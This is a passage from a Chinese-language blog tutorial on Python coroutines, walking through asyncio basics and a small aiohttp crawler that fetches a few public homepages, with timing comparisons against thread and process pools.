class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;started at <span class="hljs-subst">&#123;time.strftime(<span class="hljs-string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">await</span> say_after(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;hello&#x27;</span>)<br>    <span class="hljs-keyword">await</span> say_after(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;world&#x27;</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;finished at <span class="hljs-subst">&#123;time.strftime(<span class="hljs-string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)<br>    <br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">started at <span class="hljs-number">17</span>:<span class="hljs-number">13</span>:<span class="hljs-number">52</span><br>hello<br>world<br>finished at <span class="hljs-number">17</span>:<span class="hljs-number">13</span>:<span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>使用非常简单，在异步函数前加上async关键字，在费时间的操作前加上await关键字，就可以了。那这样是按程序顺序执行了两个say_after()函数，总的执行时间还是3秒</p><h3 id="并发执行"><a href="#并发执行" class="headerlink" title="并发执行"></a>并发执行</h3><p>那么如何并发执行呢。答案是可以用asyncio.create_task()函数，该函数可以接受一个协程，并返回一个任务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_after</span>(<span class="hljs-params">delay, what</span>):<br>    <span class="hljs-keyword">await</span> asyncio.sleep(delay)<br>    <span class="hljs-built_in">print</span>(what)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    task1 = asyncio.create_task(say_after(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;hello&#x27;</span>))<br>    task2 = asyncio.create_task(say_after(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;world&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;started at <span class="hljs-subst">&#123;time.strftime(<span class="hljs-string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">await</span> task1<br>    <span class="hljs-keyword">await</span> task2<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;finished at <span class="hljs-subst">&#123;time.strftime(<span class="hljs-string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)<br>    <br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">started at <span class="hljs-number">17</span>:<span class="hljs-number">14</span>:<span class="hljs-number">32</span><br>hello<br>world<br>finished at <span class="hljs-number">17</span>:<span class="hljs-number">14</span>:<span class="hljs-number">34</span><br></code></pre></td></tr></table></figure><p>可以看到，并发的执行时间几乎与执行时间最长的任务的执行时长相等。原先同步方式需要3秒，现在只需要2秒。</p><h3 id="可等待对象"><a href="#可等待对象" class="headerlink" title="可等待对象"></a>可等待对象</h3><p>我们注意到这里有一个<code>任务</code>的概念，在python中被称为<code>可等待对象</code>，如果一个对象可以在await语句中使用，那么这个对象就是可等待对象。python中的可等待对象除了<strong>任务</strong>，还有<strong>协程</strong>和<strong>Future</strong></p><p>task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。</p><p>Future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别</p><h3 id="并发运行任务"><a href="#并发运行任务" class="headerlink" title="并发运行任务"></a>并发运行任务</h3><p>有朋友可能会奇怪，上面不是讲过并发了吗？是的，只是这里用<code>gather()</code>方法对任务的处理做了简化。</p><p>先看一个计算阶乘的例子，用原先的写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">factorial</span>(<span class="hljs-params">name, num</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for factorial&quot;&quot;&quot;</span><br>    f = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, num + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span>: Compute factorial(<span class="hljs-subst">&#123;i&#125;</span>)...&quot;</span>)<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>        f *= i<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span>: factorial(<span class="hljs-subst">&#123;num&#125;</span>) = <span class="hljs-subst">&#123;f&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for main&quot;&quot;&quot;</span><br>    task1 = asyncio.create_task(factorial(<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-number">2</span>))<br>    task2 = asyncio.create_task(factorial(<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-number">3</span>))<br>    task3 = asyncio.create_task(factorial(<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-number">4</span>))<br><br>    <span class="hljs-keyword">await</span> task1<br>    <span class="hljs-keyword">await</span> task2<br>    <span class="hljs-keyword">await</span> task3<br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">Task A: Compute factorial(<span class="hljs-number">2</span>)...<br>Task B: Compute factorial(<span class="hljs-number">2</span>)...<br>Task C: Compute factorial(<span class="hljs-number">2</span>)...<br>Task A: factorial(<span class="hljs-number">2</span>) = <span class="hljs-number">2</span><br>Task B: Compute factorial(<span class="hljs-number">3</span>)...<br>Task C: Compute factorial(<span class="hljs-number">3</span>)...<br>Task B: factorial(<span class="hljs-number">3</span>) = <span class="hljs-number">6</span><br>Task C: Compute factorial(<span class="hljs-number">4</span>)...<br>Task C: factorial(<span class="hljs-number">4</span>) = <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>现在改用gather(*<em>aws</em>, <em>loop&#x3D;None</em>, <em>return_exceptions&#x3D;False</em>)，参数<em>aws</em>可以直接接受一个协程，将自动转为任务。如果所有可等待对象都成功完成，结果将是一个由所有返回值聚合而成的列表。结果值的顺序与 <em>aws</em> 中可等待对象的顺序一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">factorial</span>(<span class="hljs-params">name, number</span>):<br>    f = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, number + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span>: Compute factorial(<span class="hljs-subst">&#123;i&#125;</span>)...&quot;</span>)<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>        f *= i<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span>: factorial(<span class="hljs-subst">&#123;number&#125;</span>) = <span class="hljs-subst">&#123;f&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Schedule three calls *concurrently*:</span><br>    <span class="hljs-keyword">await</span> asyncio.gather(<br>        factorial(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">2</span>),<br>        factorial(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">3</span>),<br>        factorial(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">4</span>),<br>    )<br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p>执行结果与上面的程序一致</p><h2 id="协程爬虫"><a href="#协程爬虫" class="headerlink" title="协程爬虫"></a>协程爬虫</h2><p>弄明白了协程的概念，学会了简单的协程并发编程，我们可以尝试用上面的知识写一个小爬虫。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.qq.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.bilibili.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>]<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for load_url&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;loading <span class="hljs-subst">&#123;url&#125;</span>...&quot;</span>)<br>    res = <span class="hljs-keyword">await</span> requests.get(url)<br>    sc = res.status_code<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;res <span class="hljs-subst">&#123;url&#125;</span>:<span class="hljs-subst">&#123;sc&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for main&quot;&quot;&quot;</span><br>    tasks = []<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> URLS:<br>        task = load_url(url)<br>        tasks.append(task)<br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br><br>start = time.time()<br>asyncio.run(main())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;spend time: %.2f seconds.&quot;</span> % (time.time() - start))<br></code></pre></td></tr></table></figure><p>执行结果报错了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">loading https://www.baidu.com/...<br>loading https://www.sina.com/...<br>loading https://www.qq.com/...<br>loading https://www.bilibili.com...<br>loading https://www.zhihu.com...<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;crawl_async.py&quot;</span>, line <span class="hljs-number">27</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    asyncio.run(main())<br>  File <span class="hljs-string">&quot;/usr/lib/python3.8/asyncio/runners.py&quot;</span>, line <span class="hljs-number">43</span>, <span class="hljs-keyword">in</span> run<br>    <span class="hljs-keyword">return</span> loop.run_until_complete(main)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.8/asyncio/base_events.py&quot;</span>, line <span class="hljs-number">616</span>, <span class="hljs-keyword">in</span> run_until_complete<br>    <span class="hljs-keyword">return</span> future.result()<br>  File <span class="hljs-string">&quot;crawl_async.py&quot;</span>, line <span class="hljs-number">24</span>, <span class="hljs-keyword">in</span> main<br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br>  File <span class="hljs-string">&quot;crawl_async.py&quot;</span>, line <span class="hljs-number">14</span>, <span class="hljs-keyword">in</span> load_url<br>    res = <span class="hljs-keyword">await</span> requests.get(url,timeout=timeout)<br>TypeError: <span class="hljs-built_in">object</span> Response can<span class="hljs-string">&#x27;t be used in &#x27;</span><span class="hljs-keyword">await</span><span class="hljs-string">&#x27; expression</span><br></code></pre></td></tr></table></figure><p>最后一行是报错的原因，await不能用在response对象上，根据官方文档说明，await 后面的对象必须是如下格式之一：</p><ul><li>一个原生 coroutine 对象。</li><li>一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象。</li><li>一个包含 __await 方法的对象返回的一个迭代器。</li></ul><p>可以参见：<a href="https://www.python.org/dev/peps/pep-0492/#await-expression">https://www.python.org/dev/peps/pep-0492/#await-expression</a></p><p>reqeusts 返回的 Response 不符合上面任一条件，因此就会报上面的错误了。</p><p>那如果将<code>requests.get()</code>方法包裹成 coroutine 对象，试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.qq.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.bilibili.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>]<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> requests.get(url)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for load_url&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;loading <span class="hljs-subst">&#123;url&#125;</span>...&quot;</span>)<br>    res = <span class="hljs-keyword">await</span> get(url)<br>    sc = res.status_code<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;res <span class="hljs-subst">&#123;url&#125;</span>:<span class="hljs-subst">&#123;sc&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for main&quot;&quot;&quot;</span><br>    tasks = []<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> URLS:<br>        task = load_url(url)<br>        tasks.append(task)<br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br><br>start = time.time()<br>asyncio.run(main())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;spend time: %.2f seconds.&quot;</span> % (time.time() - start))<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">loading https://www.baidu.com/...<br>res https://www.baidu.com/:<span class="hljs-number">200</span><br>loading https://www.sina.com/...<br>res https://www.sina.com/:<span class="hljs-number">200</span><br>loading https://www.qq.com/...<br>res https://www.qq.com/:<span class="hljs-number">200</span><br>loading https://www.bilibili.com...<br>res https://www.bilibili.com:<span class="hljs-number">200</span><br>loading https://www.zhihu.com...<br>res https://www.zhihu.com:<span class="hljs-number">403</span><br>spend time: <span class="hljs-number">1.98</span> seconds.<br></code></pre></td></tr></table></figure><p>能正常执行，但看这个输出，并没有按我们预期的异步并发执行，也就是说我们仅仅将涉及 IO 操作的代码封装到 async 修饰的方法里面是不可行的！我们必须要使用支持异步操作的请求方式才可以实现真正的异步，所以这里就需要 aiohttp 派上用场了。</p><h2 id="aiohttp"><a href="#aiohttp" class="headerlink" title="aiohttp"></a>aiohttp</h2><p>官方文档链接为：<a href="https://aiohttp.readthedocs.io/">aiohttp</a>，它分为两部分，一部分是 Client，一部分是 Server，详细的内容可以参考官方文档。</p><p>下面我们将 aiohttp 用上来，将代码改成如下样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">import</span> time<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.qq.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.bilibili.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>]<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for load_url&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;loading <span class="hljs-subst">&#123;url&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> res:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;res <span class="hljs-subst">&#123;url&#125;</span>:<span class="hljs-subst">&#123;res.status&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for main&quot;&quot;&quot;</span><br>    tasks = []<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> URLS:<br>        task = load_url(url)<br>        tasks.append(task)<br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br><br>start = time.time()<br>asyncio.run(main())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;spend time: %.2f seconds.&quot;</span> % (time.time() - start))<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">loading https://www.baidu.com/...<br>loading https://www.sina.com/...<br>loading https://www.qq.com/...<br>loading https://www.bilibili.com...<br>loading https://www.zhihu.com...<br>res https://www.qq.com/:<span class="hljs-number">200</span><br>res https://www.sina.com/:<span class="hljs-number">200</span><br>res https://www.baidu.com/:<span class="hljs-number">200</span><br>res https://www.zhihu.com:<span class="hljs-number">200</span><br>res https://www.bilibili.com:<span class="hljs-number">200</span><br>spend time: <span class="hljs-number">0.46</span> seconds.<br></code></pre></td></tr></table></figure><p>看到这个执行结果，终于心里松了口气，异步了。</p><p>再看到这个执行时间，心里不禁：woc，牛逼。。比之前快了好几倍。</p><h2 id="与多线程、多进程对比"><a href="#与多线程、多进程对比" class="headerlink" title="与多线程、多进程对比"></a>与多线程、多进程对比</h2><p>我们把上面的代码先改成多线程的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool<br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r<br><span class="hljs-keyword">import</span> time<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.qq.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.bilibili.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;loading <span class="hljs-subst">&#123;url&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">with</span> r.get(url) <span class="hljs-keyword">as</span> conn:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;res <span class="hljs-subst">&#123;url&#125;</span>:<span class="hljs-subst">&#123;conn.code&#125;</span>&quot;</span>)<br><br>pool = ThreadPool(processes = <span class="hljs-number">50</span>)<br>start = time.time()<br>results = pool.<span class="hljs-built_in">map</span>(load_url,URLS)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;spend time: %.2f seconds.&quot;</span> % (time.time() - start))<br>pool.close()<br>pool.join()<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">loading https://www.baidu.com/...<br>loading https://www.sina.com/...<br>loading https://www.qq.com/...<br>loading https://www.bilibili.com...<br>loading https://www.zhihu.com...<br>res https://www.sina.com/:<span class="hljs-number">200</span><br>res https://www.baidu.com/:<span class="hljs-number">200</span><br>res https://www.qq.com/:<span class="hljs-number">200</span><br>res https://www.zhihu.com:<span class="hljs-number">403</span><br>res https://www.bilibili.com:<span class="hljs-number">200</span><br>spend time: <span class="hljs-number">0.54</span> seconds.<br></code></pre></td></tr></table></figure><p>可以看到开了个线程依然没有协程快</p><p>我们再把代码改成多进程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r<br><span class="hljs-keyword">import</span> time<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.qq.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.bilibili.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for load_url&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;loading <span class="hljs-subst">&#123;url&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">with</span> r.get(url) <span class="hljs-keyword">as</span> conn:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;res <span class="hljs-subst">&#123;url&#125;</span>:<span class="hljs-subst">&#123;conn.status_code&#125;</span>&quot;</span>)<br><br>pool = Pool(<span class="hljs-number">50</span>)<br>start = time.time()<br><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> URLS:<br>    pool.apply_async(load_url, args=(url,))<br>pool.close()<br>pool.join()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;spend time: %.2f seconds.&quot;</span> % (time.time() - start))<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">loading https://www.baidu.com/...<br>loading https://www.sina.com/...<br>loading https://www.qq.com/...<br>loading https://www.bilibili.com...<br>loading https://www.zhihu.com...<br>res https://www.sina.com/:<span class="hljs-number">200</span><br>res https://www.qq.com/:<span class="hljs-number">200</span><br>res https://www.baidu.com/:<span class="hljs-number">200</span><br>res https://www.zhihu.com:<span class="hljs-number">403</span><br>res https://www.bilibili.com:<span class="hljs-number">200</span><br>spend time: <span class="hljs-number">1.33</span> seconds.<br></code></pre></td></tr></table></figure><p>比多线程还慢，不得不说，协程最快，消耗的资源还少</p><p>根据上面的协程小爬虫，在安全开发中，也可以改装成扫描器</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/ellisonzhang/p/10760370.html">async&#x2F;await 实现协程</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>python</category>
      
    </categories>
    
    
